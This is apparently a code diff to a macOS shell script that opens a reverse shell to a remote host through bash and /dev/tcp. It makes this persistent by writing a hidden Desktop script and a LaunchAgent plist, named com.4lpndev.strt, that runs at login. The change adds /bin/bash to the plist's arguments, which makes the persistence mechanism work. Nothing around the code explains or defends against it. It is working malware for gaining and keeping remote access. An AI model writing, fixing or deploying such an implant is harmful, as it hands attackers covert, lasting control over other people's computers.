@@ -9,7 +9,6 @@ bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
 chmod +x /Users/$USR/Desktop/.runonstartupMACOS.sh
 
 chmod 644 ~/Library/LaunchAgents/com.4lpndev.strt.plist
-
 cat <<EOF > ~/Library/LaunchAgents/com.4lpndev.strt.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -19,6 +18,7 @@ cat <<EOF > ~/Library/LaunchAgents/com.4lpndev.strt.plist
     <string>com.4lpndev.strt</string>
     <key>ProgramArguments</key>
     <array>
+      <string>/bin/bash</string>
       <string>/Users/$USR/Desktop/.runonstartupMACOS.sh</string>
     </array>
     <key>RunAtLoad</key>
@@ -30,6 +30,7 @@ cat <<EOF > ~/Library/LaunchAgents/com.4lpndev.strt.plist
   </dict>
 </plist>
 EOF
+
 
 plutil ~/Library/LaunchAgents/com.4lpndev.strt.plist
 
